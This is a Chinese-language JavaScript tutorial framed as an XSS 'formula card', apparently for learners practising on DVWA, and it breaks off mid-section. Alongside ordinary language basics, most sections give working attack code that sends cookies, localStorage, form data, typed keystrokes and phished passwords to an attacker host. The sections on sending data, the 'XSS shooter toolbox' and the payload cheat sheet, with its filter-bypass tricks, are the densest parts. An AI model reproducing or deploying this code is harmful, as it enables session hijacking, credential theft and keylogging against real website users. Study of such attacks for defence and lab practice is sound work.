
---

# JavaScript 安全速成公式卡（完整版）

> **仿照 Python 知识点结构，每一条都关联到 Web 安全/XSS**
> **使用方法**：在浏览器里按 `F12` → Console 标签，粘贴运行

---

## 目录

- [一、输出函数（类比 Python 的 print）](#一输出函数类比-python-的-print)
- [二、变量与数据类型](#二变量与数据类型)
- [三、字符串操作](#三字符串操作)
- [四、输入函数（类比 Python 的 input）](#四输入函数类比-python-的-input)
- [五、条件判断 if-else if-else](#五条件判断-if-else-if-else)
- [六、循环 for](#六循环-for)
- [七、函数定义 function](#七函数定义-function)
- [八、事件（XSS 核心！）](#八事件xss-核心)
- [九、获取和修改网页内容（XSS 的威力）](#九获取和修改网页内容xss-的威力)
- [十、发送数据（偷来的东西发给你的 Kali）](#十发送数据偷来的东西发给你的-kali)
- [十一、综合小项目：XSS 偷 Cookie 完整脚本](#十一综合小项目xss-偷-cookie-完整脚本)
- [十二、常用 DOM 操作（XSS 进阶）](#十二常用-dom-操作xss-进阶)
- [十三、定时器（XSS 持久化）](#十三定时器xss-持久化)
- [十四、类型转换](#十四类型转换)
- [十五、运算符](#十五运算符)
- [十六、数组操作](#十六数组操作)
- [十七、对象（类比 Python 字典）](#十七对象类比-python-字典)
- [十八、JSON 处理](#十八json-处理)
- [十九、本地存储（XSS 可以偷这个）](#十九本地存储xss-可以偷这个)
- [二十、综合：XSS 射手工具箱](#二十综合xss-射手工具箱)
- [二十一、XSS 常用 Payload 速查](#二十一xss-常用-payload-速查)
- [二十二、Cookie 与 Session 安全](#二十二cookie-与-session-安全)
- [二十三、CORS 与同源策略](#二十三cors-与同源策略)
- [二十四、速查小抄](#二十四速查小抄)

---

## 一、输出函数（类比 Python 的 print）

```javascript
// 基础输出
console.log("你好");              // 输出：你好（在控制台看）
console.log("我" + "你");         // 字符串拼接，输出：我你
console.log(3 + 5);               // 输出：8
console.log("=".repeat(30));      // 输出分隔线：==============================

// 多种输出方式
console.warn("警告信息");          // 警告样式（黄色）
console.error("错误信息");         // 错误样式（红色）
console.info("提示信息");          // 提示样式
console.table([1, 2, 3]);         // 表格形式输出
console.time("计时");             // 开始计时
console.timeEnd("计时");          // 结束计时并输出耗时

// 输出到页面（XSS 常用）
document.write("<h1>Hello</h1>"); // 直接写入页面（危险！）
alert("XSS 测试");                // 弹窗（你已经在 DVWA 里用过了）
confirm("确定要删除吗？");        // 确认框（返回 true/false）
```

> **⚠️ XSS 关联**：`alert()` 是 XSS 验证的最常用方式，`console.log()` 是控制台输出（不打扰用户，用于调试）。

---

## 二、变量与数据类型

```javascript
// 变量声明（三种方式）
var old = "旧方式";              // var：函数作用域（不推荐）
let name = "小明";               // let：块作用域（推荐）
const PI = 3.14159;             // const：常量（不可修改）

// 基本数据类型
let name = "小明";               // 字符串 str
let age = 13;                   // 整数 int
let score = 95.5;              // 浮点数 float
let is_student = true;         // 布尔值 bool (true/false)
let nothing = null;            // 空值（typeof null → object，这是 JS 的 Bug）
let not_defined = undefined;   // 未定义
let bigNum = 9007199254740991n; // BigInt（大整数）
let sym = Symbol("id");        // Symbol（唯一值）

// 查看类型
console.log(typeof name);       // "string"
console.log(typeof age);        // "number"
console.log(typeof is_student); // "boolean"
console.log(typeof nothing);    // "object"（历史遗留问题）
console.log(typeof not_defined); // "undefined"

// 模板字符串（ES6+，类比 Python 的 f-string）
console.log(`姓名：${name}，年龄：${age}，分数：${score}，学生：${is_student}`);

// 多行字符串
let multi = `
  第一行
  第二行
  第三行
`;
```

> **⚠️ 安全关联**：变量可以存储从网页偷来的 Cookie。
```javascript
let stolen_cookie = document.cookie;
console.log(`偷到的 Cookie：${stolen_cookie}`);
```

---

## 三、字符串操作

```javascript
// 3.1 字符串拼接
let a = "我";
let b = "JavaScript";
console.log(a + "喜欢" + b);       // 输出：我喜欢JavaScript

// 3.2 模板字符串（类比 Python 的 f-string）
let name = "小明";
let age = 13;
console.log(`我叫${name}，今年${age}岁`);  // 输出：我叫小明，今年13岁

// 3.3 字符串方法
let s = "Hello World";
console.log(s.length);              // 11
console.log(s[0]);                  // "H"（索引从0开始）
console.log(s.charAt(0));           // "H"
console.log(s.slice(0, 5));         // "Hello"（切片 [start:end)）
console.log(s.slice(6));            // "World"
console.log(s.toLowerCase());       // "hello world"
console.log(s.toUpperCase());       // "HELLO WORLD"
console.log(s.split(" "));          // ["Hello", "World"]
console.log(s.replace("World", "JavaScript")); // "Hello JavaScript"
console.log(s.includes("Hello"));   // true
console.log(s.startsWith("He"));    // true
console.log(s.endsWith("ld"));      // true
console.log(s.indexOf("o"));        // 4
console.log(s.lastIndexOf("o"));    // 7
console.log(s.trim());              // 去除两端空格
console.log(s.repeat(3));           // "Hello WorldHello WorldHello World"

// 3.4 字符串转义
let str = "我说：\"你好\"";          // 双引号转义
let path = "C:\\Users\\Admin";      // 反斜杠转义
let multi2 = "第一行\n第二行";       // 换行
```

> **⚠️ XSS 关联**：拼接 HTML 代码（注入的关键）
```javascript
let malicious = `<img src=x onerror="alert('XSS')">`;
// 如果网站把这个字符串插入页面，就会执行弹窗
```

---

## 四、输入函数（类比 Python 的 input）

```javascript
// prompt：弹窗输入
let name = prompt("请输入你的名字：");
console.log(`你好，${name}！`);

let age = prompt("你多大了？");
age = Number(age);                // 将字符串转为数字（类比 int()）
console.log(`明年你就${age + 1}岁了`);

// confirm：确认框（返回 true/false）
let isSure = confirm("确定要删除吗？");
console.log(isSure);              // true 或 false

// 从页面获取输入（更常见）
let inputElement = document.querySelector('input[type="text"]');
let value = inputElement.value;   // 获取输入框的值
```

> **⚠️ 安全关联**：`prompt()` 可以用来钓鱼（假弹窗骗密码）
```javascript
function fakeLogin() {
    let password = prompt("会话已过期，请重新输入密码：");
    if (password) {
        // 发送到攻击者服务器
        fetch('http://你的IP:8080/steal?password=' + encodeURIComponent(password));
    }
}
```

---

## 五、条件判断 if-else if-else

```javascript
let age = 13;
if (age < 12) {
    console.log("小朋友");
} else if (age > 14) {
    console.log("大朋友");
} else {
    console.log("刚刚好13岁");
}

// 三元表达式（类比 Python 的三元运算）
let result = age >= 18 ? "成年" : "未成年";
console.log(result);

// switch 语句（类比 Python 的 match-case）
let day = 3;
switch (day) {
    case 1:
        console.log("周一");
        break;
    case 2:
        console.log("周二");
        break;
    case 3:
        console.log("周三");
        break;
    default:
        console.log("其他");
}

// 多条件判断
if (age >= 18 && age <= 60) {
    console.log("工作年龄");
}
if (age < 12 || age > 65) {
    console.log("老人或小孩");
}
```

> **⚠️ 安全关联**：判断 Cookie 是否存在
```javascript
if (document.cookie) {
    console.log("找到 Cookie，准备偷走");
    // fetch('http://你的IP:8080?c=' + document.cookie)
} else {
    console.log("没有 Cookie");
}
```

---

## 六、循环 for

```javascript
// 6.1 基础 for 循环
console.log("--- for循环基础 ---");
for (let i = 0; i < 5; i++) {     // i从0到4
    console.log(`第${i}次循环`);
}

// 6.2 遍历数组
console.log("--- 遍历数组 ---");
let fruits = ["苹果", "香蕉", "橙子"];
for (let i = 0; i < fruits.length; i++) {
    console.log(`水果：${fruits[i]}`);
}

// 6.3 for...of（更方便）
for (let fruit of fruits) {
    console.log(`水果：${fruit}`);
}

// 6.4 for...in（遍历对象属性）
let person = {name: "小明", age: 18};
for (let key in person) {
    console.log(`${key}: ${person[key]}`);
}

// 6.5 forEach（数组专用）
fruits.forEach(function(fruit, index) {
    console.log(`第${index+1}个水果：${fruit}`);
});

// 6.6 while 循环
let count = 0;
while (count < 5) {
    console.log(count);
    count++;
}

// 6.7 break 和 continue
for (let i = 0; i < 10; i++) {
    if (i === 3) continue;    // 跳过
    if (i === 7) break;       // 退出
    console.log(i);           // 0,1,2,4,5,6
}
```

> **⚠️ 安全关联**：遍历页面所有链接，偷走它们
```javascript
let links = document.querySelectorAll('a');
for (let link of links) {
    console.log(`找到链接：${link.href}`);
    // 可以发送到你的服务器
}
```

---

## 七、函数定义 function

```javascript
// 7.1 函数声明（传统方式）
function sayHello() {
    console.log("你好！");
    console.log("欢迎学习JavaScript");
}
sayHello();                       // 调用函数

// 7.2 带参数函数
function greet(name) {
    console.log(`你好，${name}！`);
}
greet("小明");                    // 输出：你好，小明！
greet("小红");                    // 输出：你好，小红！

// 7.3 带返回值的函数
function add(a, b) {
    return a + b;                // return返回结果
}
let result = add(3, 5);
console.log(`3+5=${result}`);    // 输出：3+5=8

// 7.4 函数表达式（匿名函数赋值给变量）
let multiply = function(a, b) {
    return a * b;
};
console.log(multiply(3, 4));     // 12

// 7.5 箭头函数（ES6+，更简洁）
let divide = (a, b) => a / b;
console.log(divide(10, 2));      // 5

// 单参数可省略括号
let square = x => x * x;
console.log(square(5));          // 25

// 多行箭头函数需要大括号和 return
let complex = (a, b) => {
    let result = a + b;
    return result * 2;
};

// 7.6 默认参数
function greetWithTitle(name, title = "先生") {
    console.log(`${title}${name}，你好`);
}
greetWithTitle("小明");          // 先生小明，你好
greetWithTitle("小红", "女士");   // 女士小红，你好

// 7.7 剩余参数（类比 Python 的 *args）
function sumAll(...numbers) {
    let total = 0;
    for (let num of numbers) {
        total += num;
    }
    return total;
}
console.log(sumAll(1, 2, 3, 4));  // 10
```

> **⚠️ 安全关联**：偷 Cookie 的函数
```javascript
function stealCookie() {
    let cookie = document.cookie;
    if (cookie) {
        // fetch('http://你的IP:8080?c=' + cookie)
        console.log(`偷到的 Cookie：${cookie}`);
    }
}
stealCookie();
```

---

## 八、事件（XSS 核心！）

### 8.1 常见的 XSS 事件

```html
<!-- HTML 事件属性（XSS 常用） -->
<img src="x" onerror="alert('XSS')">            <!-- 图片加载失败时触发 -->
<div onmouseover="alert('XSS')">鼠标移过来</div> <!-- 鼠标滑过时触发 -->
<body onload="alert('XSS')">                   <!-- 页面加载时触发 -->
<a href="javascript:alert('XSS')">点我</a>      <!-- 点击链接时触发 -->
<input onfocus="alert('XSS')">                 <!-- 获取焦点时触发 -->
<button onclick="alert('XSS')">点击</button>    <!-- 点击时触发 -->
<iframe onload="alert('XSS')">                 <!-- 框架加载时触发 -->
<script>alert('XSS')</script>                  <!-- 直接执行脚本 -->
```

### 8.2 JavaScript 事件绑定

```javascript
// 方式1：直接赋值
let div = document.createElement('div');
div.innerHTML = "鼠标移到我身上";
div.onmouseover = function() {
    alert("XSS 触发！");
};
document.body.appendChild(div);

// 方式2：addEventListener（推荐）
let button = document.querySelector('button');
button.addEventListener('click', function() {
    alert('按钮被点击了！');
});

// 方式3：事件监听器（一次）
button.addEventListener('click', function handler() {
    alert('只触发一次');
    button.removeEventListener('click', handler);
}, { once: true });
```

### 8.3 常用 DOM 事件类型

| 事件类型 | 触发条件 | XSS 常用度 |
|---------|---------|-----------|
| `onerror` | 资源加载失败 | ⭐⭐⭐⭐⭐ |
| `onload` | 页面/资源加载完成 | ⭐⭐⭐⭐⭐ |
| `onmouseover` | 鼠标悬停 | ⭐⭐⭐⭐ |
| `onclick` | 点击元素 | ⭐⭐⭐⭐ |
| `onfocus` | 输入框获得焦点 | ⭐⭐⭐ |
| `onsubmit` | 表单提交 | ⭐⭐⭐ |
| `onkeydown` / `onkeyup` | 键盘事件 | ⭐⭐⭐ |
| `onchange` | 输入框值变化 | ⭐⭐ |
| `ontouchstart` | 触摸开始（移动端） | ⭐⭐⭐ |
| `onhashchange` | URL 锚点变化 | ⭐⭐ |
| `onmessage` | 收到 postMessage | ⭐⭐⭐ |

> **⚠️ 这些就是 XSS 攻击的核心！你已经在 DVWA 里用过了**

---

## 九、获取和修改网页内容（XSS 的威力）

```javascript
// 9.1 获取 Cookie
console.log(document.cookie);          // 显示当前网站的 Cookie

// 9.2 修改页面内容
document.body.innerHTML = "<h1>网站被黑了</h1>";  // 整个页面被改

// 9.3 修改页面标题
document.title = "XSS 攻击成功";

// 9.4 读取页面内容
console.log(document.body.innerText);   // 偷看页面文字
console.log(document.body.textContent); // 纯文本（不包含 HTML 标签）

// 9.5 修改样式
document.body.style.backgroundColor = "red";
document.body.style.color = "white";

// 9.6 偷表单项（比如用户名密码）
let passwordInput = document.querySelector('input[type="password"]');
if (passwordInput) {
    console.log(`偷到的密码：${passwordInput.value}`);
}

let usernameInput = document.querySelector('input[name="username"]');
if (usernameInput) {
    console.log(`偷到的用户名：${usernameInput.value}`);
}

// 9.7 偷取所有表单数据
function stealAllFormData() {
    let inputs = document.querySelectorAll('input');
    let data = {};
    inputs.forEach(input => {
        data[input.name || input.type || 'unknown'] = input.value;
    });
    console.log(JSON.stringify(data));
    return data;
}

// 9.8 查看网页源代码
console.log(document.documentElement.outerHTML);
```

> **⚠️ 这些都是真正的 XSS 攻击手段**

---

## 十、发送数据（偷来的东西发给你的 Kali）

```javascript
// 10.1 用 fetch 发送（现代方式）
fetch('http://你的IP:8080?cookie=' + document.cookie);

// 10.2 用 Image 发送（老式方法，兼容性好）
new Image().src = 'http://你的IP:8080?c=' + document.cookie;

// 10.3 用 XMLHttpRequest 发送
let xhr = new XMLHttpRequest();
xhr.open('GET', 'http://你的IP:8080?c=' + document.cookie);
xhr.send();

// 10.4 完整的偷 Cookie 代码（POST 方式）
if (document.cookie) {
    fetch('http://你的IP:8080/steal', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cookie=' + encodeURIComponent(document.cookie)
    });
}

// 10.5 使用 navigator.sendBeacon（页面关闭时也能发送）
if (document.cookie) {
    navigator.sendBeacon('http://你的IP:8080/steal', document.cookie);
}

// 10.6 通过 DNS 隧道（隐蔽）
new Image().src = `http://${btoa(document.cookie)}.你的域名.com`;
```

> **⚠️ 这是你 XSS 公式卡里的"第三发：窃取 Cookie"**

---

## 十一、综合小项目：XSS 偷 Cookie 完整脚本

```javascript
// 完整版 XSS 偷 Cookie 脚本
function xss_steal() {
    let cookie = document.cookie;
    if (cookie) {
        console.log(`[+] 找到 Cookie：${cookie}`);
        // 发送到攻击者服务器（配合 nc 监听）
        fetch('http://你的IP:8080?cookie=' + encodeURIComponent(cookie))
            .catch(e => console.log('发送失败，尝试备用方法'));
        
        // 备用方法：用 Image
        new Image().src = 'http://你的IP:8080?cookie=' + encodeURIComponent(cookie);
        console.log("[+] Cookie 已发送！");
    } else {
        console.log("[-] 没有找到 Cookie");
    }
}

// 自动执行
xss_steal();

// 在你的 DVWA XSS 页面输入：
// <script>xss_steal()</script>
// 或者直接输入上面的代码

// 增强版：偷取更多信息
function xss_steal_advanced() {
    let data = {
        cookie: document.cookie,
        url: location.href,
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        referrer: document.referrer,
        time: new Date().toISOString(),
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    
    fetch('http://你的IP:8080/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}
```

---

## 十二、常用 DOM 操作（XSS 进阶）

```javascript
// 12.1 获取元素
document.getElementById('id名');                 // 通过 ID
document.querySelector('.class名');             // 通过 CSS 选择器（第一个）
document.querySelectorAll('a');                 // 通过 CSS 选择器（全部）
document.getElementsByClassName('class名');    // 通过类名
document.getElementsByTagName('div');          // 通过标签名
document.getElementsByName('username');        // 通过 name 属性

// 12.2 修改元素内容和属性
let elem = document.querySelector('#myDiv');
elem.innerHTML = '<h1>新内容</h1>';            // 修改 HTML 内容（危险）
elem.textContent = '纯文本内容';                // 修改文本内容（安全）
elem.setAttribute('src', 'new_image.jpg');     // 修改属性
elem.style.color = 'red';                      // 修改 CSS
elem.style.display = 'none';                   // 隐藏元素
elem.className = 'new-class';                  // 修改类
elem.classList.add('active');                  // 添加类
elem.classList.remove('hidden');               // 移除类

// 12.3 创建新元素
let newDiv = document.createElement('div');
newDiv.innerHTML = '<h1>被注入的内容</h1>';
newDiv.id = 'injected';
document.body.appendChild(newDiv);             // 添加到页面末尾

// 12.4 插入元素
let parent = document.querySelector('#container');
parent.prepend(newDiv);                        // 插入到开头
parent.append(newDiv);                         // 插入到末尾
parent.insertBefore(newDiv, parent.firstChild); // 插入到指定元素前

// 12.5 删除元素
let target = document.querySelector('#toRemove');
target.remove();                               // 删除元素（现代方式）
target.parentNode.removeChild(target);         // 删除元素（传统方式）

// 12.6 获取/修改 URL
console.log(location.href);                    // 完整 URL
console.log(location.host);                    // 域名+端口
console.log(location.pathname);                // 路径
console.log(location.search);                  // 查询参数 ?a=1&b=2
console.log(location.hash);                    // 锚点 #section

// 修改 URL（不刷新页面）
history.pushState({}, '', '/new-page');        // 修改 URL
location.hash = '#section';                    // 修改锚点
```

> **⚠️ 这些都是 XSS 和 DOM 型 XSS 的基础**

---

## 十三、定时器（XSS 持久化）

```javascript
// 13.1 每隔 3 秒执行一次（持续偷）
setInterval(function() {
    fetch('http://你的IP:8080?c=' + document.cookie);
}, 3000);

// 13.2 5 秒后执行一次
setTimeout(function() {
    alert("5 秒后弹窗");
}, 5000);

// 13.3 清除定时器
let timerId = setTimeout(function() { console.log("执行"); }, 1000);
clearTimeout(timerId);                         // 取消定时器

let intervalId = setInterval(function() { console.log("执行"); }, 1000);
clearInterval(intervalId);                     // 取消循环

// 13.4 XSS 持久化示例：每 5 秒偷一次 Cookie
function persistentSteal() {
    setInterval(function() {
        if (document.cookie) {
            new Image().src = 'http://你的IP:8080?c=' + encodeURIComponent(document.cookie);
        }
    }, 5000);
}
persistentSteal();
```

> **⚠️ 可以让你的 XSS 持续偷 Cookie，即使页面刷新了**

---

## 十四、类型转换

```javascript
// 14.1 字符串转数字
let num_str = "123";
let num_int = Number(num_str);                 // 123
let num_parse = parseInt("123.45");            // 123（整数）
let num_float = parseFloat("123.45");          // 123.45
let num_unary = +"123";                        // 123（一元运算符）
console.log(`字符串"${num_str}"转数字：${num_int}，类型：${typeof num_int}`);

// 14.2 数字转字符串
let age = 13;
let age_str = String(age);                     // "13"
let age_str2 = age.toString();                 // "13"
let age_str3 = age + "";                       // "13"
console.log(`数字${age}转字符串："${age_str}"，类型：${typeof age_str}`);

// 14.3 转布尔值
console.log(`Boolean(1)：${Boolean(1)}`);      // true
console.log(`Boolean(0)：${Boolean(0)}`);      // false
console.log(`Boolean("")：${Boolean("")}`);    // false
console.log(`Boolean("hello")：${Boolean("hello")}`); // true
console.log(`Boolean(null)：${Boolean(null)}`); // false
console.log(`Boolean(undefined)：${Boolean(undefined)}`); // false

// 14.4 类型判断
console.log(typeof 123);         // "number"
console.log(typeof "hello");     // "string"
console.log(typeof true);        // "boolean"
console.log(typeof {});          // "object"
console.log(typeof []);          // "object"（数组也是对象）
console.log(typeof null);        // "object"（JS 的 Bug）
console.log(typeof undefined);   // "undefined"
console.log(typeof function(){}); // "function"

// 判断数组（推荐）
console.log(Array.isArray([1, 2, 3]));  // true
console.log(Array.isArray({}));         // false
```

---

## 十五、运算符

```javascript
// 15.1 算术运算符
console.log("=== 算术运算符 ===");
console.log(`10 + 3 = ${10 + 3}`);
console.log(`10 - 3 = ${10 - 3}`);
console.log(`10 * 3 = ${10 * 3}`);
console.log(`10 / 3 = ${10 / 3}`);
console.log(`10 % 3 = ${10 % 3}`);      // 取余（和 Python 一样）
console.log(`10 ** 2 = ${10 ** 2}`);    // 幂运算

// 15.2 比较运算符
console.log("=== 比较运算符 ===");
console.log(`5 === 5：${5 === 5}`);     // === 严格等于（推荐，不转换类型）
console.log(`5 == "5"：${5 == "5"}`);   // == 宽松等于（会转换类型，不推荐）
console.log(`5 !== "5"：${5 !== "5"}`); // 严格不等于
console.log(`5 > 3：${5 > 3}`);
console.log(`5 < 3：${5 < 3}`);

// 15.3 逻辑运算符
console.log("=== 逻辑运算符 ===");
console.log(`true && true：${true && true}`);  // 与（and）
console.log(`true && false：${true && false}`);
console.log(`true || false：${true || false}`); // 或（or）
console.log(`false || false：${false || false}`);
console.log(`!true：${!true}`);                // 非（not）

// 15.4 短路运算（常用技巧）
let username = null;
let displayName = username || "游客";           // "游客"
console.log(`displayName: ${displayName}`);

// 15.5 赋值运算符
let x = 5;
x += 3;   // x = x + 3
x -= 2;   // x = x - 2
x *= 4;   // x = x * 4
x /= 2;   // x = x / 2
x %= 3;   // x = x % 3

// 15.6 自增/自减
let count = 0;
count++;  // 1（后置自增）
++count;  // 2（前置自增）
count--;  // 1

// 15.7 三元运算符
let age = 18;
let status = age >= 18 ? "成年" : "未成年";
console.log(status);  // "成年"
```

---

## 十六、数组操作

```javascript
// 16.1 创建数组
let fruits = ["苹果", "香蕉", "橙子"];
let numbers = [1, 2, 3, 4, 5];
let mixed = [1, "hello", true, null];          // 混合类型
let empty = [];                                // 空数组
let fromString = "a,b,c".split(",");           // ["a", "b", "c"]

// 16.2 访问和修改
console.log(`列表：${fruits}`);
console.log(`第一个元素：${fruits[0]}`);
console.log(`最后一个元素：${fruits[fruits.length-1]}`);
fruits[1] = "芒果";                            // 修改

// 16.3 添加和删除
fruits.push("葡萄");          // 末尾添加 → ["苹果","香蕉","橙子","葡萄"]
fruits.unshift("草莓");       // 开头添加 → ["草莓","苹果","香蕉","橙子","葡萄"]
let last = fruits.pop();      // 删除末尾 → "葡萄"
let first = fruits.shift();   // 删除开头 → "草莓"
fruits.splice(1, 1);          // 从索引1开始删除1个 → 删除"香蕉"
fruits.splice(1, 0, "西瓜");  // 在索引1插入"西瓜"

// 16.4 查找
console.log(fruits.indexOf("苹果"));    // 0
console.log(fruits.includes("苹果"));   // true
console.log(fruits.find(item => item.startsWith("苹"))); // "苹果"

// 16.5 排序和反转
let nums = [3, 1, 4, 1, 5];
nums.sort();                  // [1, 1, 3, 4, 5]
nums.sort((a, b) => b - a);   // 降序 [5, 4, 3, 1, 1]
nums.reverse();               // 反转

// 16.6 数组方法（函数式编程）
let arr = [1, 2, 3, 4, 5];
arr.forEach(x => console.log(x));              // 遍历
let squares = arr.map(x => x * x);            // 映射 → [1,4,9,16,25]
let evens = arr.filter(x => x % 2 === 0);     // 过滤 → [2,4]
let sum = arr.reduce((a, b) => a + b, 0);     // 累加 → 15
let allEven = arr.every(x => x % 2 === 0);    // 全部偶数？→ false
let hasEven = arr.some(x => x % 2 === 0);     // 有偶数？→ true

// 16.7 复制和合并
let copy = arr.slice();                       // 浅拷贝
let copy2 = [...arr];                         // 展开运算符（ES6+）
let merged = arr.concat([6, 7, 8]);           // 合并
let merged2 = [...arr, 6, 7, 8];              // 展开合并

// 16.8 数组长度
console.log(`列表长度：${fruits.length}`);
```

---

## 十七、对象（类比 Python 字典）

```javascript
// 17.1 创建对象
let person = {
    name: "小明",
    age: 13,
    city: "北京",
    hobbies: ["编程", "读书"],
    greet: function() {
        console.log(`你好，我是${this.name}`);
    }
};

console.log(`对象：${JSON.stringify(person)}`);
console.log(`姓名：${person.name}`);
console.log(`年龄：${person.age}`);
console.log(`爱好：${person.hobbies.join(", ")}`);
person.greet();                               // 调用方法

// 17.2 访问和修改
person.city = "上海";                         // 修改
person.hobby = "编程";                        // 添加属性
delete person.city;                          // 删除属性

// 17.3 多种访问方式
console.log(person.name);                    // 点号访问
console.log(person["name"]);                 // 方括号访问（支持变量）
let key = "age";
console.log(person[key]);                    // 变量访问

// 17.4 对象方法
console.log(Object.keys(person));            // ["name","age","hobbies","greet","hobby"]
console.log(Object.values(person));          // ["小明",13, ...]
console.log(Object.entries(person));         // [["name","小明"], ...]

// 17.5 对象解构
let { name, age } = person;
console.log(name, age);                      // 小明 13

// 17.6 对象合并
let defaultConfig = { theme: "dark", lang: "zh" };
let userConfig = { theme: "light" };
let config = { ...defaultConfig, ...userConfig }; // { theme:"light", lang:"zh" }
```

---

## 十八、JSON 处理

```javascript
// 18.1 对象转 JSON 字符串
let obj = { name: "小明", age: 13, hobbies: ["编程", "读书"] };
let json_str = JSON.stringify(obj);
console.log(`JSON字符串：${json_str}`);
console.log(JSON.stringify(obj, null, 2));   // 格式化输出（带缩进）

// 18.2 JSON 字符串转对象
let json_data = '{"name":"小红","age":12,"hobbies":["画画","音乐"]}';
let obj2 = JSON.parse(json_data);
console.log(`解析后姓名：${obj2.name}`);
console.log(`解析后爱好：${obj2.hobbies.join(", ")}`);

// 18.3 JSON 与深拷贝
let original = { a: 1, b: { c: 2 } };
let deepCopy = JSON.parse(JSON.stringify(original));  // 深拷贝
deepCopy.b.c = 99;
console.log(original.b.c);                    // 2（没变）

// 18.4 JSON.stringify 特殊用法
// 替换函数
let obj3 = { name: "小明", password: "123456", age: 13 };
let safe = JSON.stringify(obj3, function(key, value) {
    if (key === "password") return undefined; // 排除敏感字段
    return value;
});
console.log(safe);                            // {"name":"小明","age":13}

// 自定义 toJSON
let user = {
    name: "小明",
    _password: "123456",
    toJSON() {
        return { name: this.name };           // 只返回 name
    }
};
console.log(JSON.stringify(user));            // {"name":"小明"}
```

> **⚠️ 安全关联**：很多 API 返回 JSON，你需要学会解析和处理。

---

## 十九、本地存储（XSS 可以偷这个）

```javascript
// 19.1 localStorage（持久存储，不会过期）
localStorage.setItem("token", "abc123");
localStorage.setItem("user", JSON.stringify({ name: "小明", role: "admin" }));

// 读取
let token = localStorage.getItem("token");
console.log(`偷到的 token：${token}`);

let userData = JSON.parse(localStorage.getItem("user"));
console.log(`用户名：${userData.name}`);

// 删除
localStorage.removeItem("token");
localStorage.clear();                         // 清空所有

// 19.2 sessionStorage（会话存储，关闭标签页后清除）
sessionStorage.setItem("session_id", "xyz789");
let sessionId = sessionStorage.getItem("session_id");

// 19.3 XSS 偷 localStorage
function stealLocalStorage() {
    let data = {};
    for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        data[key] = localStorage.getItem(key);
    }
    fetch('http://你的IP:8080/steal?data=' + encodeURIComponent(JSON.stringify(data)));
}
stealLocalStorage();

// 19.4 Cookie vs localStorage
// Cookie：每次请求自动发送（适合认证），大小限制 4KB
// localStorage：不会自动发送（适合存储），大小限制 5-10MB
// XSS 可以偷 localStorage 里的敏感数据（比 Cookie 更危险！）
```

> **⚠️ XSS 可以偷 localStorage 里的敏感数据（比 Cookie 更危险）**

---

## 二十、综合：XSS 射手工具箱

```javascript
// ==================== XSS 射手工具箱 ====================

// 工具1：偷 Cookie 并发送
function stealCookie() {
    if (document.cookie) {
        fetch('http://你的IP:8080/steal?data=' + encodeURIComponent(document.cookie));
        new Image().src = 'http://你的IP:8080/steal?c=' + encodeURIComponent(document.cookie);
        return "Cookie 已发送";
    }
    return "没有 Cookie";
}

// 工具2：偷页面内容
function stealPage() {
    let content = document.body.innerText;
    fetch('http://你的IP:8080/steal?data=' + encodeURIComponent(content));
    return "页面内容已发送";
}

// 工具3：偷表单数据
function stealForms() {
    let inputs = document.querySelectorAll('input');
    let data = {};
    inputs.forEach(input => {
        data[input.name || input.type || 'unknown'] = input.value;
    });
    fetch('http://你的IP:8080/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
    return "表单数据已发送";
}

// 工具4：弹窗钓鱼（偷密码）
function fakeLogin() {
    let password = prompt("会话已过期，请重新输入密码：");
    if (password) {
        fetch('http://你的IP:8080/steal?password=' + encodeURIComponent(password));
        alert("登录成功！");
    }
}

// 工具5：键盘记录器
let keys = "";
document.onkeypress = function(e) {
    keys += e.key;
    // 每 10 个字符发送一次
    if (keys.length > 10) {
        fetch('http://你的IP:8080/keys?data=' + encodeURIComponent(keys));
        keys = "";
    }
};

// 工具6：截屏页面（使用 html2canvas）
function stealScreenshot() {
    // 需要引入 html2canvas 库
    if (typeof html2canvas !== 'undefined') {
        html2canvas(document.body).then(canvas => {
            let img = canvas.toDataURL();
            fetch('http://你的IP:8080/steal', {
                method: 'POST',
                body: img
            });
        });
    }
}

// 工具7：偷取所有 Cookie、LocalStorage、SessionStorage
function stealAll() {
    let data = {
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: location.href,
        userAgent: navigator.userAgent
    };
    fetch('http://你的IP:8080/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    });
}

// 工具8：偷取所有链接和表单
function stealLinksAndForms() {
    let links = [];
    document.querySelectorAll('a').forEach(a => {
        links.push(a.href);
    });
    let forms = [];
    document.querySelectorAll('form').forEach(form => {
        forms.push({
            action: form.action,
            method: form.method,
            inputs: Array.from(form.querySelectorAll('input')).map(i => ({
                name: i.name,
                type: i.type
            }))
        });
    });
    fetch('http://你的IP:8080/steal', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ links, forms })
    });
}

// 一键执行所有
function xss_full_attack() {
    stealCookie();
    stealAll();
    stealLinksAndForms();
    console.log("[+] 全量攻击已执行");
}
```

---

## 二十一、XSS 常用 Payload 速查

### 21.1 基础验证

```html
<!-- 弹窗验证 -->
<script>alert(1)</script>
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- HTML 事件 -->
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### 21.2 绕过过滤

```html
<!-- 大小写绕过 -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- 编码绕过 -->
<script>alert&#x28;1&#x29;</script>
<script>\u0061lert(1)</script>

<!-- 注释绕过 -->
<script>/* 注释 */alert(1)</script>
<script>alert(1)// 注释</script>

<!-- 事件拼接 -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC="x" onerror="alert(1)">

<!-- 换行/空格绕过 -->
<script>
alert(1)
</script>
<img src=x onerror=
alert(1)>

<!-- 反引号绕过 -->
<script>`alert(1)`</script>
```

### 21.3 高级攻击 Payload

```html
<!-- 偷 Cookie -->
<script>new Image().src='http://xss.com?c='+document.cookie</script>
<script>fetch('http://xss.com?c='+document.cookie)</script>
<script>location='http://xss.com?c='+document.cookie</script>

<!-- 偷键盘记录 -->
<script>
